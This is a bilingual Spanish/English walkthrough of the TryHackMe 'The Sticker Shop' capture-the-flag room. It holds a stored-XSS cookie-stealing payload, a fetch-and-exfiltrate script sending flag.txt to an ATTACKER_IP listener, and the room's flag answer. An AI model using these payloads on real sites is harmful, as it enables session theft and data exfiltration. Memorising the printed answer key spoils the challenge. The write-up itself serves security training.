# The Sticker Shop

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Easy | CTF / Web challenge | `thestickershop` | https://tryhackme.com/room/thestickershop | 01 Level Easy | TryHackMe | XSS / stored XSS / stored feedback / flag.txt / 401 / fetch / exfiltración / servidor de escucha | Lectura de `flag.txt` (protegido con 401) mediante un XSS almacenado en el formulario de feedback que hace que la app (que navega como el usuario) realice un fetch al recurso y filtre la flag a un servidor del atacante. |

---

**Contexto:** Reto easy de explotación cliente en el que tu tienda local de stickers publica su web en el mismo ordenador con el que sus dueños navegan y leen el feedback. El objetivo es leer `http://MACHINE_IP:8080/flag.txt`, protegido con 401 Unauthorized al acceder directamente. El formulario `/submit_feedback` sufre un XSS almacenado (guardado y ejecutado sin sanitización): se inyecta un payload JavaScript que hace `fetch('/flag.txt')` desde el contexto de la página y envía el contenido (base64) a un servidor HTTP controlado por el atacante para recuperar la flag.

> **ES:** Tienda de stickers vulnerable a XSS almacenado: se envía feedback con un `<script>`/`<svg onload>` que hace fetch de `flag.txt` y exfiltra su contenido al atacante; se decodifica el base64 recibido y se obtiene la flag.
> **EN:** Cat sticker shop vulnerable to stored XSS: submit feedback with a `<script>`/`<svg onload>` that fetches `flag.txt` and exfiltrates its content to the attacker; decode the received base64 and get the flag.

## Solucionario

### Task 1: Obtén la flag / Get the flag

**Explicación:** `flag.txt` devuelve 401 al acceder directamente, pero la aplicación ejecuta el feedback guardado en el contexto del usuario que lo revisa. Se confirma el XSS almacenado con un payload que hace un ping (p. ej. `<script>document.location='http://ATTACKER/?cookie='+document.cookie</script>` o un SVG con onload) y después se exfiltra el contenido de `http://127.0.0.1:8080/flag.txt` con `fetch()` enviándolo a un servidor del atacante; el dato llega codificado y se decodifica para obtener la flag.

**Respuesta original verbatim:**
```text
1. THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

```html
<script>
fetch('http://127.0.0.1:8080/flag.txt')
  .then(response => response.text())
  .then(data => {
    let img = new Image();
    img.src = 'http://ATTACKER_IP:PORT/?data=' + encodeURIComponent(data);
    document.body.appendChild(img);
  });
</script>
```

```bash
python3 -m http.server 5000   # servidor de escucha -> GET /?data=VEhNezgzNzg5...e6fQ==
echo '...' | base64 -d         # decodificar
```

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | ¿Cuál es el contenido de flag.txt? / What is the content of flag.txt? | `THM{83789a69074f636f64a38879cfcabe8b62305ee6}` |

---

| # | Pregunta | Respuesta |
|---|---|---|
| 1 | ¿Cuál es el contenido de flag.txt? / What is the content of flag.txt? | `THM{83789a69074f636f64a38879cfcabe8b62305ee6}` |

---

**Metodología:** Visitar `http://MACHINE_IP:8080/` -> enumerar la tienda (feedback en `/submit_feedback`) -> confirmar XSS almacenado con payload de ping/`document.location` -> levantar un servidor HTTP de escucha -> enviar feedback con `fetch('http://127.0.0.1:8080/flag.txt')` + exfiltración vía Image/src (`/?#data=...`) -> recibir el contenido codificado -> decodificar (base64) -> flag.

### Cadena de ataque / Attack Chain

```text
store (8080) -> /submit_feedback -> stored XSS -> fetch 127.0.0.1:8080/flag.txt -> exfiltrar data -> servidor HTTP atacante -> base64 decode -> THM{83789a69074f636f64a38879cfcabe8b62305ee6}
```

**Learning chain:** Web enumeration -> stored XSS detection -> payload casting (fetch + exfiltración) -> blind SSRF/data exfiltration -> decoding -> flag.

**Lección:** *Un formulario que guarda y renderiza input sin sanitizar es un XSS almacenado: si la propia aplicación navega por los mismos recursos protegidos, ese HTML inyectado se convierte en un proxy para leerlos y exfiltrarlos.*

**MITRE ATT&CK:** T1059.007 (Command and Scripting Interpreter: JavaScript), T1005 (Data from Local System), T1189 (Drive-by Compromise).

**Fuente:** [TryHackMe - The Sticker Shop](https://tryhackme.com/room/thestickershop)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.

**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.

**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).

**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.